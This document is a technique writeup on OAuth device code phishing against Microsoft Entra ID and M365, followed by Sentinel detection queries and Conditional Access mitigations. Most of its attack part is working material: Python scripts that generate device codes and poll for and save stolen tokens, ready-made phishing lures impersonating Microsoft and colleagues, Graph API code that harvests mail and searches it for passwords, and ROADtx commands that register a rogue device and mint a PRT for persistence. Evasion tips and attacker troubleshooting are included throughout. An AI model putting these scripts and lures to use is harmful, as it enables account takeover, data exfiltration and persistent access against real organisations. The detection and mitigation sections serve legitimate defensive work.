# [IA-PHISH-001]: Device Code Phishing Attacks

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-001 |
| **MITRE ATT&CK v18.1** | [T1566.002 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/) |
| **Tactic** | Initial Access |
| **Platforms** | Entra ID, M365 |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-02-13 |
| **Affected Versions** | All Entra ID versions (all Microsoft 365 subscription levels) |
| **Patched In** | N/A (design-level issue, mitigations via Conditional Access only) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Section 6 (Atomic Red Team) not included because no standardized Atomic test exists specifically for device code phishing (T1566.002 covers broader spearphishing techniques). All section numbers have been dynamically renumbered based on applicability.

---

## 1. EXECUTIVE SUMMARY

**Concept:** Device code phishing exploits the OAuth 2.0 Device Authorization Grant flow (RFC 8628), a legitimate mechanism designed for devices with limited keyboard input (smart TVs, IoT devices, CLI tools). Attackers initiate a device code flow and trick victims into entering the code on Microsoft's legitimate sign-in portal (`https://microsoft.com/devicelogin`), thereby granting the attacker valid authentication tokens without needing the user's password or triggering multi-factor authentication (MFA). Once tokens are obtained, adversaries can access victim mailboxes, files, and Microsoft Graph API to exfiltrate data or register malicious devices for persistence.

**Attack Surface:** The attack leverages Microsoft's legitimate OAuth infrastructure, making detection extraordinarily difficult. No malicious links, attachments, or phishing portals are involved—the victim authenticates against Microsoft's real authentication servers. Attackers typically deliver phishing messages via Microsoft Teams, WhatsApp, Signal, or internal email, impersonating trusted colleagues, executives, or system administrators.

**Business Impact:** **Critical exposure across the entire M365 tenant.** This technique has been validated in production environments and is actively exploited by state-sponsored actors (Storm-2372, attributed to Russian state interests). Initial access can lead to email exfiltration, credential harvesting (usernames, passwords, tokens, admin details found in email), lateral movement to additional accounts via internal messaging, device registration for long-term persistence, and potential compromise of the entire organization if high-privilege accounts are targeted.

**Technical Context:** Device code phishing campaigns have been active since August 2024, with reported success rates exceeding years of traditional spearphishing efforts combined. The technique bypasses most email security controls (no malicious links, no payloads), defeats MFA in several configurations, and evades Conditional Access policies that fail to explicitly block device code flow. Tokens remain valid for extended periods (hours to days), enabling post-compromise reconnaissance and persistence via Primary Refresh Token (PRT) acquisition through device registration.

### Operational Risk

- **Execution Risk:** **Low** — Requires only social engineering; no technical complexity. Attacker simply initiates device code flow and forwards legitimate Microsoft code to victim.
- **Stealth:** **Very High** — Generates minimal audit trail compared to password attacks; uses legitimate Microsoft authentication infrastructure.
- **Reversibility:** **No** — Once tokens are obtained and used, data exfiltration and lateral movement cannot be undone. Requires full credential revocation and forensic investigation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1, 5.2 | Lack of MFA enforcement and Conditional Access policy controls enable unauthorized access. |
| **DISA STIG** | AC-2, AC-3 | Inadequate account management and access control implementation. |
| **CISA SCuBA** | IdM-1, IdM-2 | Weak identity governance and access management controls. |
| **NIST 800-53** | AC-2, AC-3, AC-6, SI-4 | Access enforcement, account management, privilege restrictions, and system monitoring failures. |
| **GDPR** | Art. 32 | Technical and organizational measures for security of processing are insufficient. |
| **DORA** | Art. 9 | Protection and prevention measures for ICT risk management fail to address authentication flow vulnerabilities. |
| **NIS2** | Art. 21 | Cyber security risk management measures lack multi-factor authentication and access controls. |
| **ISO 27001** | A.9.2.3, A.9.4.3 | Failures in management of privileged access rights and authentication mechanisms. |
| **ISO 27005** | Risk Scenario: "Compromise of User Authentication" | Inadequate detection and prevention of unauthorized token acquisition. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Attacker Side:** None (any user can initiate device code flow with a public client ID like Microsoft Graph PowerShell).
- **Victim Side:** Any valid user account (no special permissions required).

**Required Access:**
- Victim must have access to internet browser and be able to navigate to `https://microsoft.com/devicelogin` (or equivalent login portal).
- Attacker must have communication channel to victim (email, Teams chat, Signal, WhatsApp, etc.).

**Supported Versions:**
- **Entra ID:** All versions (the device code flow is a core OAuth 2.0 feature in Microsoft Entra ID and Azure AD).
- **M365 Applications:** All versions supporting modern authentication (Office 365, Teams, Outlook Web Access).
- **Operating Systems:** Device code phishing is platform-agnostic; victims can be on Windows, macOS, Linux, iOS, or Android.

**Tools & Environment:**
- Python 3.8+ with `requests` library or similar HTTP client.
- Any terminal/CLI tool capable of making HTTP POST requests (curl, PowerShell).
- Legitimate Microsoft client IDs (publicly documented):
  - Microsoft Graph PowerShell (04b07795-8ddb-461a-bbee-02f9e1bf7b46)
  - Visual Studio Code (aebc6443-996d-45c2-90f0-388ff96faa56)
  - Microsoft Authentication Broker (29d9ed98-a469-4536-ade2-f981bc1d605e) — **used by state actors for persistence**
- Attacker infrastructure (server to listen for tokens or C2 callback).

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Detection of Device Code Flow Usage in Tenant

**Management Portal / PowerShell Reconnaissance:**

Defenders can enumerate device code flow usage by querying Entra ID sign-in logs for authentication protocol `deviceCode`:

```powershell
# Query Entra ID Sign-In Logs for device code flows
Connect-MgGraph -Scopes "AuditLog.Read.All"

$deviceCodeFlows = Get-MgAuditLogSignIn -Filter "authenticationProtocol eq 'deviceCode'" -Top 50 | `
  Select-Object UserDisplayName, UserPrincipalName, AppDisplayName, IPAddress, CreatedDateTime, Status

$deviceCodeFlows | Format-Table
```

**What to Look For:**

- **Unexpected applications:** Client IDs that don't match approved tools (expected: VSCode, Graph PowerShell; suspicious: custom/unknown client IDs).
- **Unusual user patterns:** Admin accounts or sensitive service accounts using device code (highly suspicious).
- **Geographically anomalous IPs:** Device code flows from regions not aligned with user location history.
- **Timing anomalies:** Device code flows outside business hours or in rapid succession.

**PowerShell Command (Azure AD/Entra ID):**

```powershell
# Advanced query using Azure Monitor / Log Analytics
Invoke-AzRestMethod -Uri "https://graph.microsoft.com/v1.0/auditLogs/signIns" `
  -Method GET | ConvertFrom-Json | `
  Where-Object { $_.authenticationProtocol -eq "deviceCode" } | `
  Select-Object userDisplayName, appDisplayName, ipAddress, createdDateTime
```

**Version Note:** Entra ID sign-in logs have been consistent since Azure AD era; no breaking changes in reporting between versions.

**CLI / Azure CLI Equivalent:**

```bash
# Query device code flows via Azure CLI (requires CLI v2.50.0+)
az ad signed-in-user show --query "id"

# Note: Detailed sign-in log queries require REST API or Kusto Query Language (KQL) in Sentinel/Log Analytics
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Device Code Phishing with Graph PowerShell Client ID

**Supported Versions:** Entra ID all versions; M365 all subscription levels

#### Step 1: Initiate Device Code Flow (Attacker)

**Objective:** Generate a valid device code and user code that will be sent to the victim.

**Python Script:**

```python
import requests
import json

# Attacker's setup - initiate device code flow
client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Microsoft Graph PowerShell (public client)
tenant_id = "organizations"  # Multi-tenant, no specific tenant required

device_code_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode"

# Request device code
payload = {
    "client_id": client_id,
    "scope": "https://graph.microsoft.com/.default offline_access"
}

response = requests.post(device_code_url, data=payload)
device_code_response = response.json()

# Extract key codes
device_code = device_code_response.get("device_code")
user_code = device_code_response.get("user_code")
verification_uri = device_code_response.get("verification_uri")
expires_in = device_code_response.get("expires_in")  # Typically 15 minutes

print(f"[+] Device Code Generated:")
print(f"    User Code: {user_code}")
print(f"    Verification URI: {verification_uri}")
print(f"    Expires In: {expires_in} seconds")
print(f"\n[+] Send user code to victim with phishing message...")
```

**Expected Output:**

```
{
  "device_code": "DAQABAAEAv...",
  "user_code": "G7QJ-P9T3",
  "verification_uri": "https://microsoft.com/devicelogin",
  "expires_in": 900,
  "interval": 5
}
```

**What This Means:**

- `user_code` (e.g., `G7QJ-P9T3`): The 8-character code attacker sends to victim in phishing message.
- `device_code`: The secret code attacker uses to poll for tokens (kept by attacker).
- `verification_uri`: The legitimate Microsoft URL where victim will enter the user code.
- `expires_in`: Device code validity window (typically 15 minutes / 900 seconds).

**OpSec & Evasion:**

- The device code flow itself is legitimate; no blocking will occur at the Microsoft infrastructure level.
- Attacker can use anonymous proxies or residential proxies to mask their IP during token polling.
- Once tokens are obtained, attacker can delete the device code request from logs if they gain admin access (though log retention may prevent full erasure).
- **Detection Likelihood:** **Medium-High** — Conditional Access policies and sign-in log analysis can flag device code flows if enabled; however, many organizations lack specific device code blocking.

**Troubleshooting:**

- **Error:** `invalid_client` (Client ID does not support device code flow)
  - **Cause:** Client ID selected does not support device code grant (e.g., web app client ID).
  - **Fix:** Use publicly documented client IDs known to support device code (Graph PowerShell, VSCode, Auth Broker).

- **Error:** `unauthorized_client` (Tenant policy blocks device code)
  - **Cause:** Organization has already deployed Conditional Access policy blocking device code.
  - **Fix:** Attempt with different organization (wider phishing campaign) or pivot to OAuth consent grant attack (T1566.002 variant).

**References & Proofs:**

- [Microsoft OAuth 2.0 Device Authorization Grant](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code)
- [RFC 8628 - OAuth 2.0 Device Authorization Grant](https://tools.ietf.org/html/rfc8628)
- [Compass Security Research - Device Code Phishing](https://blog.compass-security.com/2024/01/device-code-phishing-add-your-own-sign-in-methods-on-entra-id/)

#### Step 2: Social Engineer Victim to Enter Code

**Objective:** Deliver the user code to the victim via phishing message and convince them to authenticate.

**Phishing Lure Examples (Real-World Storm-2372 Tactics):**

```
========== PHISHING EMAIL 1: Teams Meeting Invite ==========
Subject: You're invited to join "Project Alpha" meeting

Hi Alice,

You've been invited to a Microsoft Teams meeting. To join, please verify your account by entering this code:

G7QJ-P9T3

Go to: https://microsoft.com/devicelogin

This meeting includes sensitive project details, so authentication is required.

Thanks,
Bob (bob@competitor-gov.agency)

========== PHISHING EMAIL 2: Security Verification ==========
Subject: Action Required: Verify Your Account Access

Dear User,

We've detected unusual activity on your account. To restore access, please verify your identity by entering this code on the Microsoft verification portal:

G7QJ-P9T3

Visit: https://microsoft.com/devicelogin

If you don't complete verification within 30 minutes, your account will be locked.

- Microsoft Security Team

========== PHISHING TEAMS MESSAGE ==========
Hey! I found a tool that will help us automate the deployment. 

Here's the code to log in: G7QJ-P9T3

Go to microsoft.com/devicelogin and enter it. Your account will be verified in seconds.

Thanks!
```

**Why This Works:**

- No malicious domain; victim goes to legitimate Microsoft URL.
- No suspicious attachments or file downloads; antivirus/DLP cannot detect it.
- Victim's own browser; credential interception tools (AiTM proxies) not needed.
- Social engineering premise appears legitimate (meeting, verification, security incident).
- Real Microsoft authentication prompt; victim cannot distinguish from legitimate requests.

**OpSec & Evasion:**

- Attacker uses messaging apps (Teams, WhatsApp, Signal) to deliver codes—bypassing email DLP/URL filtering.
- Impersonation is crucial: use display names matching executives, teammates, or system administrators.
- Reference specific projects, meetings, or shared context to increase credibility.
- **Detection Likelihood:** **Medium** — Email/Teams message filtering can catch generic phishing lures; however, highly targeted spearphishing (using OSINT on targets) often evades initial screening.

#### Step 3: Poll for Access Token (Attacker)

**Objective:** Once victim enters the user code, poll the token endpoint to retrieve the access token.

**Python Script (Continued):**

```python
import time

# Attacker waits and polls for tokens
token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"

polling_interval = device_code_response.get("interval", 5)  # Poll every 5 seconds
max_attempts = expires_in // polling_interval  # Total polling attempts

for attempt in range(max_attempts):
    print(f"[*] Polling attempt {attempt + 1}/{max_attempts}...")
    
    token_payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": client_id
    }
    
    token_response = requests.post(token_url, data=token_payload)
    token_data = token_response.json()
    
    # Check if victim has authenticated
    if "access_token" in token_data:
        access_token = token_data.get("access_token")
        refresh_token = token_data.get("refresh_token")
        id_token = token_data.get("id_token")
        
        print(f"\n[+] SUCCESS! Tokens received:")
        print(f"    Access Token (first 50 chars): {access_token[:50]}...")
        print(f"    Refresh Token: {refresh_token[:50] if refresh_token else 'N/A'}...")
        print(f"    ID Token (User Info): {id_token[:50] if id_token else 'N/A'}...")
        
        # Save tokens for later use
        with open("stolen_tokens.json", "w") as f:
            json.dump(token_data, f)
        
        break
    
    elif "error" in token_data:
        error = token_data.get("error")
        
        if error == "authorization_pending":
            print(f"    [*] Still waiting for victim to authenticate...")
            time.sleep(polling_interval)
        
        elif error == "authorization_declined":
            print(f"    [!] Victim declined the authentication request. Phishing failed.")
            break
        
        elif error == "expired_token":
            print(f"    [!] Device code expired. Phishing attempt timed out.")
            break
        
        else:
            print(f"    [!] Error: {error}")
            break
    
    time.sleep(polling_interval)
```

**Expected Output (On Success):**

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6I...",
  "refresh_token": "0.ARQAv...",
  "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6I...",
  "token_type": "Bearer",
  "expires_in": 3599,
  "scope": "https://graph.microsoft.com/.default"
}
```

**What This Means:**

- **access_token:** JWT token valid for ~1 hour; used to call Graph API on behalf of the victim.
- **refresh_token:** Longer-lived token (hours to days); allows silent re-authentication without user interaction.
- **id_token:** Contains victim's identity information (UPN, name, tenant ID, etc.).
- **expires_in:** Access token validity in seconds (typically 3600 = 1 hour).

**OpSec & Evasion:**

- Polling pattern appears as normal user authentication behavior; no suspicious command execution or registry access.
- Attacker can use anonymous proxy or residential IP to obscure polling source.
- Once tokens are obtained, attacker can continue operations even if device code expires.
- **Detection Likelihood:** **High-Medium** — Sentinel/SIEM can detect rapid device code polling (e.g., >3 poll attempts), but legitimate tools also poll at intervals.

**Troubleshooting:**

- **Error:** `authorization_pending` (Victim hasn't entered code yet)
  - **Cause:** Phishing message hasn't been read or victim hasn't navigated to portal.
  - **Fix:** Wait and re-send phishing reminder message; continue polling up to 15-minute expiration.

- **Error:** `authorization_declined` (Victim rejected authentication)
  - **Cause:** Victim clicked "Cancel" instead of authenticating.
  - **Fix:** Resend phishing message with different pretext; generate new device code.

- **Error:** `expired_token` (Device code expired after 15 minutes)
  - **Cause:** Polling timed out; victim did not authenticate within window.
  - **Fix:** Generate new device code and attempt again with same victim or different targets.

**References & Proofs:**

- [RFC 8628 Device Authorization Grant - Token Response](https://tools.ietf.org/html/rfc8628#section-3.5)
- [Embrace the Red - Device Code Phishing](https://embracethered.com/blog/posts/2022/device-code-phishing/)

#### Step 4: Access Victim's Data via Graph API

**Objective:** Use the stolen access token to exfiltrate sensitive data from victim's M365 account.

**Python Script (Continued):**

```python
import requests

# Attacker uses stolen access token to access Graph API
headers = {
    "Authorization": f"Bearer {access_token}",
    "Content-Type": "application/json"
}

# Example 1: Retrieve victim's emails
print("\n[+] Exfiltrating emails from victim's mailbox...")
emails_url = "https://graph.microsoft.com/v1.0/me/messages?$top=100"

emails_response = requests.get(emails_url, headers=headers)
emails = emails_response.json().get("value", [])

for email in emails[:5]:  # Display first 5 emails
    print(f"    From: {email.get('from', {}).get('emailAddress', {}).get('address')}")
    print(f"    Subject: {email.get('subject')}")
    print(f"    Received: {email.get('receivedDateTime')}")
    print()

# Example 2: Search for sensitive keywords in emails (Storm-2372 tactic)
print("[+] Searching for sensitive information in emails...")
search_keywords = ["password", "admin", "credentials", "secret", "teamviewer", "anydesk"]

for keyword in search_keywords:
    search_url = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"{keyword}\""
    search_response = requests.get(search_url, headers=headers)
    matching_emails = search_response.json().get("value", [])
    
    if matching_emails:
        print(f"    [!] Found {len(matching_emails)} emails containing '{keyword}'")
        for email in matching_emails[:2]:
            print(f"        - {email.get('subject')} (from {email.get('from', {}).get('emailAddress', {}).get('address')})")

# Example 3: List user's file shares and OneDrive
print("\n[+] Enumerating user's SharePoint sites...")
sites_url = "https://graph.microsoft.com/v1.0/me/drive"

sites_response = requests.get(sites_url, headers=headers)
user_drive = sites_response.json()

print(f"    OneDrive ID: {user_drive.get('id')}")
print(f"    OneDrive Quota: {user_drive.get('quota', {}).get('total')} bytes")

# Example 4: List Teams user is a member of
print("\n[+] Enumerating user's Teams...")
teams_url = "https://graph.microsoft.com/v1.0/me/joinedTeams"

teams_response = requests.get(teams_url, headers=headers)
teams = teams_response.json().get("value", [])

for team in teams[:5]:
    print(f"    - {team.get('displayName')} (ID: {team.get('id')})")

print("\n[+] Exfiltration complete. Tokens saved to 'stolen_tokens.json'")
```

**Expected Output:**

```
[+] Exfiltrating emails from victim's mailbox...
    From: ceo@company.com
    Subject: Q4 Budget Approval - DO NOT SHARE
    Received: 2025-02-10T14:23:00Z

    From: sysadmin@company.com
    Subject: VPN Credentials - New Policy
    Received: 2025-02-09T09:15:00Z

[+] Searching for sensitive information in emails...
    [!] Found 12 emails containing 'password'
        - IT Password Reset Process (from it-support@company.com)
        - Admin Account Credentials for Azure (from cto@company.com)

[+] Enumerating user's SharePoint sites...
    OneDrive ID: 01FKZXVN7HFPQRZ...
    OneDrive Quota: 1099511627776 bytes

[+] Enumerating user's Teams...
    - Executive Leadership
    - Security & Compliance
    - Engineering
```

**What This Means:**

- Attacker can read all emails, files, and collaboration content accessible to the victim.
- Keyword searches reveal sensitive information (passwords, credentials, admin details) that can be used for lateral movement.
- Access extends to all Microsoft 365 services (Teams, SharePoint, OneDrive, Outlook, etc.).

**OpSec & Evasion:**

- Graph API calls appear as normal user activity; difficult to distinguish from legitimate application access.
- Attacker should limit API calls to avoid triggering rate-limiting alerts (Graph has per-app and per-user thresholds).
- Access tokens are short-lived (1 hour), but refresh tokens can be used to obtain new access tokens silently.
- **Detection Likelihood:** **Medium** — Unusual Graph API query patterns (bulk email searches for keywords like "password") can be flagged by advanced analytics; however, legitimate admin tools and apps generate similar patterns.

**References & Proofs:**

- [Microsoft Graph API - Mail Resources](https://learn.microsoft.com/en-us/graph/api/resources/mail-api-overview)
- [Volexity - Phishing for Codes Research](https://www.volexity.com/blog/2025/02/13/multiple-russian-threat-actors-targeting-microsoft-device-code-authentication/)

---

### METHOD 2: Device Code Phishing with Microsoft Authentication Broker for Device Registration & Persistence

**Supported Versions:** Entra ID all versions; M365 all subscription levels (Windows 10/11 for device simulation)

**Overview:** This advanced method chains device code phishing with device registration and Primary Refresh Token (PRT) acquisition, enabling long-term persistence and Conditional Access bypass.

#### Step 1: Initiate Device Code Flow Targeting Device Registration Service

**Objective:** Generate a device code that, once authenticated, will allow device registration and PRT acquisition.

**Python Script:**

```python
import requests
import json

# Attacker targets Device Registration Service (DRS) instead of Graph API
client_id = "29d9ed98-a469-4536-ade2-f981bc1d605e"  # Microsoft Authentication Broker (first-party, trusted)
tenant_id = "organizations"

device_code_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode"

# Request device code with DRS resource target
payload = {
    "client_id": client_id,
    "scope": "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default offline_access openid profile",  # DRS scopes
    "response_type": "code"
}

response = requests.post(device_code_url, data=payload)
device_code_response = response.json()

user_code = device_code_response.get("user_code")
device_code = device_code_response.get("device_code")

print(f"[+] Device Code Generated for DRS Registration:")
print(f"    User Code: {user_code}")
print(f"    Device Code: {device_code}")
print(f"\n[+] Send user code to victim with DRS-targeted phishing message...")
```

**Phishing Lure (DRS-Specific):**

```
Subject: Microsoft Account Security Update - Device Registration Required

Hi Alice,

Your Microsoft account requires device registration to maintain compliance with our organization's policies. 

Please verify your device by entering this code:

G7QJ-P9T3

Visit: https://microsoft.com/devicelogin

This will register your device and enable seamless access to organizational resources.

- Microsoft IT Security
```

#### Step 2: Poll for Tokens (Including Refresh Token)

**Objective:** Retrieve access token, refresh token, and ID token for DRS interaction.

**Python Script:**

```python
# Poll for tokens (similar to METHOD 1, Step 3)
# Key difference: response will include refresh_token and adrs_access scope

token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"

token_payload = {
    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
    "device_code": device_code,
    "client_id": client_id
}

token_response = requests.post(token_url, data=token_payload)
token_data = token_response.json()

access_token = token_data.get("access_token")
refresh_token = token_data.get("refresh_token")
id_token = token_data.get("id_token")

print(f"[+] Tokens received:")
print(f"    Scope: adrs_access (Device Registration Service)")
print(f"    Refresh Token: {refresh_token[:50]}...")

# Save for ROADtx device registration
with open(".roadtool_auth", "w") as f:
    json.dump({
        "access_token": access_token,
        "refresh_token": refresh_token,
        "id_token": id_token,
        "token_type": "Bearer",
        "_clientId": client_id
    }, f)

print(f"[+] Tokens saved to .roadtool_auth for ROADtx device registration")
```

#### Step 3: Register Malicious Device Using ROADtx (Open-Source Tool)

**Objective:** Use the tokens to register a fake hybrid-joined device in Entra ID.

**Commands:**

```bash
# Install ROADtx (https://github.com/dirkjanm/ROADtools)
pip install roadtools

# Initialize ROADtx with saved tokens
roadtx auth load -j .roadtool_auth

# Create a virtual Windows device (no physical hardware needed)
roadtx device create --os-version "10.0.19041.928" --device-name "DESKTOP-MALICIOUS"

# The response will include:
# - Device ID
# - Device certificate and private key (in PEM format)
# - Device enrollment status

roadtx device list
```

**Expected Output:**

```
[+] Device registered successfully
    Device ID: 12345678-1234-1234-1234-123456789012
    Device Name: DESKTOP-MALICIOUS
    OS Version: Windows 10 (10.0.19041.928)
    Trust Type: Hybrid Azure AD joined
    Compliance Status: Not compliant (expected)
    Owner: alice@company.com (victim)
```

#### Step 4: Mint Primary Refresh Token (PRT)

**Objective:** Exchange the refresh token for a PRT, which grants long-lived, device-bound authentication.

**Commands:**

```bash
# Exchange refresh token for PRT
roadtx prt request --device-id "12345678-1234-1234-1234-123456789012"

# Response includes:
# - PRT (Primary Refresh Token)
# - PRT+R (PRT refresh token)
# - Device key (cryptographic credential)
```

**What This Means:**

- **PRT:** A token-granting token that allows silent acquisition of new access tokens for any first-party Microsoft app (Outlook, Teams, Graph, etc.).
- **Device Trust:** Entra ID now trusts the malicious device as a registered, hybrid-joined endpoint.
- **Conditional Access Bypass:** Many CAPs allow "compliant devices" or "registered devices" through without requiring MFA.
- **Persistence:** PRT remains valid for extended periods (weeks/months) and can be silently renewed.

#### Step 5: Use PRT for Ongoing Attacks

**Objective:** Leverage PRT to access victim's data and maintain persistence.

**Example: Access Teams Files with PRT**

```bash
# Authenticate as victim using PRT
roadtx prtauth --prt-cookie "<PRT_VALUE>" --client "Teams" --resource "https://graph.microsoft.com"

# Response includes new access token valid for Graph API

# Use access token to enumerate teams and exfiltrate files
curl -H "Authorization: Bearer <ACCESS_TOKEN>" \
  "https://graph.microsoft.com/v1.0/teams?$expand=channels(\$expand=messages)" | jq
```

**Forensic Evidence of PRT Usage:**

- Attacker can request access tokens for any service without re-authenticating or triggering additional MFA.
- Device registration event in Entra ID audit logs (correlation ID links all events).
- Multiple token requests from the registered device with no additional user interaction.

---

## 5. TOOLS & COMMANDS REFERENCE

### [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)

**Version:** 2.0+  
**Client ID:** `04b07795-8ddb-461a-bbee-02f9e1bf7b46`  
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell 7.0+

**Installation:**

```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
```

**Usage (Legitimate):**

```powershell
Connect-MgGraph -Scopes "User.Read" -DeviceCode
# Attacker uses the generated device code to phish victim
```

### [ROADtx - ROADTools Device Registration Tool](https://github.com/dirkjanm/ROADtools)

**Version:** 0.3.0+  
**Supported Platforms:** Linux, Windows, macOS  
**Dependencies:** Python 3.7+, requests, pycryptodomex

**Installation:**

```bash
git clone https://github.com/dirkjanm/ROADtools.git
cd ROADtools
pip install -r requirements.txt
```

**Usage (Post-Device Code Phishing):**

```bash
# Load phished tokens
roadtx auth load -j .roadtool_auth

# Register virtual device
roadtx device create --os-version "10.0.19041.928"

# Mint PRT
roadtx prt request

# Authenticate using PRT
roadtx prtauth --client "Teams"
```

**References:**

- [ROADtools GitHub](https://github.com/dirkjanm/ROADtools)
- [Volexity - ROADtx Usage Analysis](https://www.volexity.com/blog/2025/02/13/multiple-russian-threat-actors-targeting-microsoft-device-code-authentication/)

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Device Code Authentication Flows with Suspicious Properties

**Rule Configuration:**
- **Required Table:** SignInLogs
- **Required Fields:** authenticationProtocol, userPrincipalName, ipAddress, appDisplayName
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Entra ID all versions

**KQL Query:**

```kusto
SignInLogs
| where authenticationProtocol == "deviceCode"
| where resultDescription != "Success"  // Initially failed attempts may indicate phishing
| summarize 
    FailureCount = dcount(TimeGenerated),
    SuccessCount = dcountif(ResultSignInStatus, ResultSignInStatus == "0"),
    UniqueApps = dcount(AppDisplayName),
    UniqueIPs = dcount(IPAddress),
    FirstAttempt = min(TimeGenerated),
    LastAttempt = max(TimeGenerated)
    by UserPrincipalName, IPAddress
| where FailureCount > 2 or (SuccessCount > 0 and UniqueIPs > 1)
| project TimeGenerated = LastAttempt, UserPrincipalName, IPAddress, FailureCount, UniqueApps, UniqueIPs
```

**What This Detects:**

- Multiple failed device code authentication attempts followed by success (indicates phishing attempt followed by victim entering code).
- Same user authenticating from multiple distinct IP addresses within short time window (possible token reuse or device code delivery via different channels).

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **Name:** `Suspicious Device Code Authentication Flow`
4. **Severity:** `High`
5. **Frequency:** `Every 5 minutes`
6. Paste the KQL query above
7. Configure incident settings (e.g., "Create incidents from alerts triggered by this analytics rule")
8. Click **Review + create**

### Query 2: Device Code Flow Followed by Rapid Graph API Access

**KQL Query:**

```kusto
let deviceCodeAuth = SignInLogs
| where authenticationProtocol == "deviceCode"
| where ResultSignInStatus == "0"
| project TimeGenerated, UserPrincipalName, IPAddress, SessionId = CorrelationId, AppDisplayName;

let graphAccess = SignInLogs
| where AppDisplayName == "Microsoft Graph" or ResourceDisplayName == "Microsoft Graph"
| where ResultSignInStatus == "0"
| project TimeGenerated, UserPrincipalName, IPAddress, SessionId = CorrelationId, AppDisplayName;

deviceCodeAuth
| join kind=inner graphAccess on UserPrincipalName, SessionId
| where TimeGenerated1 < TimeGenerated and (TimeGenerated - TimeGenerated1) between (0s .. 5m)
| project 
    TimeGenerated,
    UserPrincipalName,
    DeviceCodeTime = TimeGenerated1,
    GraphAccessTime = TimeGenerated,
    TimeDiff = (TimeGenerated - TimeGenerated1),
    IPAddress
| where TimeDiff < 1m  // Suspicious if Graph access happens immediately after device code auth
```

**What This Detects:**

- Device code authentication immediately followed by Graph API access (indicates successful phishing and token usage).

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation) — Limited Relevance**

- **Trigger:** If attacker executes PowerShell or Python scripts on victim's machine to interact with Graph API.
- **Filter:** CommandLine contains "graph.microsoft.com" or "device_code" or "refresh_token"
- **Applies To Versions:** Windows Server 2016+, Windows 10+

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation** → **Success and Failure**
4. Run `gpupdate /force`

**Note:** Device code phishing attacks primarily manifest in cloud logs (Entra ID Sign-In Logs, Unified Audit Log) rather than Windows event logs, since authentication occurs at Microsoft infrastructure, not locally.

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: OAuth Device Code Flow and Graph API Access

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing** and wait 24 hours for activation

**PowerShell Query:**

```powershell
Connect-ExchangeOnline

# Search for device code flows and subsequent Graph API access
Search-UnifiedAuditLog `
  -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  -Operations "Consent to application", "Add OAuth2PermissionGrant", "Add service principal" `
  -ResultSize 1000 | `
  Where-Object { $_.AuditData -like "*device*" } | `
  Export-Csv -Path "C:\Audit\device_code_phishing.csv"
```

**What to Look For:**

- **Operation:** Consent to application (victim granting permissions)
- **AuditData contains:** device_code, Microsoft Authentication Broker, Device Registration Service
- **Timeline:** Rapid sequence of operations (phishing → consent → device registration) within minutes

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Block Device Code Flow with Conditional Access Policy**

This is the **primary mitigation** recommended by Microsoft. Device code flow is high-risk and rarely needed in modern organizations.

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Device Code Flow`
4. **Assignments:**
   - **Users:** All users
   - **Exclude:** Break-glass/emergency access accounts only
5. **Target resources:**
   - **Resources:** All resources (or specific apps if device code is legitimately needed)
6. **Conditions:**
   - Click **Conditions** → **Authentication flows** → **Configure: Yes**
   - Select **Device code flow**
7. **Access controls:**
   - **Grant:** Select **Block access**
8. **Enable policy:** Start in **Report-only** mode first to assess impact
9. Click **Create**

**Verify Blocking:**

```powershell
# Attempt to use device code flow (will fail with blocked policy)
Connect-MgGraph -Scopes "User.Read" -DeviceCode

# Expected error: "AADSTS53000: Device is not in required device state"
```

**Manual Steps (PowerShell):**

```powershell
Connect-MgGraph -Scopes "Identity.ConditionalAccess.Read.All"

# Create Conditional Access policy to block device code
$params = @{
    displayName = "Block Device Code Flow"
    state = "enabledForReportingButNotEnforced"  # Start in report-only
    conditions = @{
        users = @{
            includeUsers = @("All")
        }
        applications = @{
            includeApplications = @("All")
        }
